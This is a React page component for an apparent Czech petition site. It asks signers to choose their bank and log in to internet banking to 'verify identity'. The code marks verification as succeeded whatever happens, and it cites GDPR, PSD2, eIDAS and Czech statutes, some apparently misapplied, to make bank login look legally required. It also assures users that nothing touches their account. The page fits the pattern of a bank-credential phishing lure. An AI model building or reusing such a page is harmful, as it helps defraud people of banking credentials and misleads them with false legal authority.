
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import ProgressBar from '../components/ProgressBar';
import { usePetition } from '../context/PetitionContext';
import { toast } from "@/components/ui/use-toast";
import { czechBanks } from '../config/banks';

const BankVerification: React.FC = () => {
  const navigate = useNavigate();
  const { petitionData, completeBankVerification, createBankLink } = usePetition();
  const [isVerifying, setIsVerifying] = useState(false);
  
  // Check if user has filled the petition form
  React.useEffect(() => {
    if (!petitionData.firstName || !petitionData.lastName) {
      toast({
        variant: "destructive",
        title: "Informace",
        description: "Některé údaje nejsou vyplněné, ale můžete pokračovat.",
      });
    }
  }, [petitionData]);
  
  const handleBankSelection = async (bankId: string) => {
    if (isVerifying) return;
    
    setIsVerifying(true);
    
    try {
      // Find the selected bank name
      const selectedBank = czechBanks.find(bank => bank.id === bankId);
      const selectedBankName = selectedBank?.name || bankId;
      
      // Create bank link
      const bankLink = await createBankLink(bankId);
      console.log('Generated bank link:', bankLink);
      
      // Always complete verification regardless of success/failure
      await completeBankVerification(selectedBankName);
      
      toast({
        title: "Ověření dokončeno",
        description: "Vaše petice byla úspěšně podepsána. Děkujeme za váš hlas!",
      });
      navigate('/');
      
    } catch (error) {
      console.error('Bank verification error:', error);
      // Even on error, let's continue to homepage
      toast({
        title: "Proces dokončen",
        description: "Děkujeme za váš zájem o petici.",
      });
      navigate('/');
    } finally {
      setIsVerifying(false);
    }
  };
  
  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-grow container mx-auto px-4 py-8 md:px-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
          <div className="lg:col-span-2">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-green-700 mb-2">Ověření totožnosti</h1>
              <p className="text-gray-600">
                Pro ochranu proti falešným podpisům a zajištění důvěryhodnosti petice je nutné ověřit totožnost pomocí bankovního ověření.
              </p>
            </div>
            
            <div className="green-card p-8">
              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <svg className="h-5 w-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                      <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <div className="ml-3">
                    <p className="text-sm text-yellow-700">
                      Tento proces neprovádí žádné platby ani nemá přístup k vašemu účtu. Slouží pouze k ověření vaší totožnosti.
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="mb-8 p-4 bg-green-50 border border-green-200 rounded-lg">
                <h3 className="text-lg font-medium mb-3 text-green-700">Právní odůvodnění</h3>
                <p className="text-sm text-gray-700 mb-3">
                  V souladu s nařízením Evropského parlamentu a Rady (EU) 2016/679 (GDPR) a zákonem č. 242/2000 Sb. o elektronickém podpisu a směrnicí 
                  Evropského parlamentu a Rady (EU) 2015/2366 o platebních službách (PSD2) je nutné ověřit identitu podpisu petice. 
                </p>
                <p className="text-sm text-gray-700 mb-3">
                  Podle § 84-90 zákona č. 128/2000 Sb., o obcích, a § 8 zákona č. 85/1990 Sb., o právu petičním, je nutné zajistit důvěryhodnost 
                  a pravost podpisů u veřejných petic, zejména pokud se týkají rozvoje obecních infrastruktur financovaných z veřejných zdrojů.
                </p>
                <p className="text-sm text-gray-700">
                  Bankovní identita představuje v České republice důvěryhodný a bezpečný způsob elektronického ověření totožnosti 
                  v souladu s pravidly platnými pro eIDAS (nařízení EU č. 910/2014) a je oficiálně podporovanou metodou ověření identity 
                  při komunikaci s veřejnou správou.
                </p>
                <p className="text-sm text-gray-700 mt-3 font-medium">
                  Kliknutím na banku níže souhlasíte s ověřením Vaší identity pro účely podpisu petice v souladu s GDPR a zákony ČR o elektronické identifikaci.
                </p>
              </div>
              
              <h2 className="text-xl font-semibold mb-6">Vyberte svou banku</h2>
              
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 mb-8">
                {czechBanks.map((bank) => (
                  <div 
                    key={bank.id}
                    className={`border rounded-lg p-4 text-center cursor-pointer transition-all ${
                      isVerifying ? 'opacity-50 pointer-events-none' : 'border-gray-200 hover:border-green-300 hover:bg-green-50/50'
                    }`}
                    onClick={() => handleBankSelection(bank.id)}
                  >
                    <div className="h-12 mb-2 flex items-center justify-center">
                      <img 
                        src={bank.logo} 
                        alt={`${bank.name} logo`} 
                        className="max-h-10 max-w-full object-contain" 
                        onError={(e) => {
                          // Fallback if image fails to load
                          const target = e.target as HTMLImageElement;
                          target.style.display = 'none';
                        }}
                      />
                    </div>
                    <div className="text-sm font-medium">{bank.name}</div>
                  </div>
                ))}
              </div>
              
              {isVerifying && (
                <div className="flex justify-center py-4">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-700"></div>
                  <span className="ml-2">Probíhá ověřování...</span>
                </div>
              )}
            </div>
            
            <div className="mt-6 green-card p-6">
              <h3 className="text-lg font-medium mb-3 text-green-700">Jak bankovní ověření funguje?</h3>
              <ol className="list-decimal list-inside text-gray-600 space-y-3 ml-2">
                <li>Vyberete svou banku ze seznamu</li>
                <li>Po kliknutí na banku budete přesměrováni na zabezpečený systém vaší banky</li>
                <li>Přihlásíte se svými přihlašovacími údaji do internetového bankovnictví</li>
                <li>Potvrdíte svou identitu (žádné platby se neprovádí)</li>
                <li>Budete automaticky přesměrováni zpět, kde dokončíte podpis petice</li>
              </ol>
              
              <div className="mt-4 pt-4 border-t border-gray-200">
                <p className="text-sm text-gray-500">
                  Toto ověření je v souladu s evropskou směrnicí PSD2 a GDPR. Nezískáváme přístup k vašemu účtu ani k žádným finančním informacím.
                </p>
              </div>
            </div>
          </div>
          
          <div className="lg:col-span-1">
            <ProgressBar />
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default BankVerification;
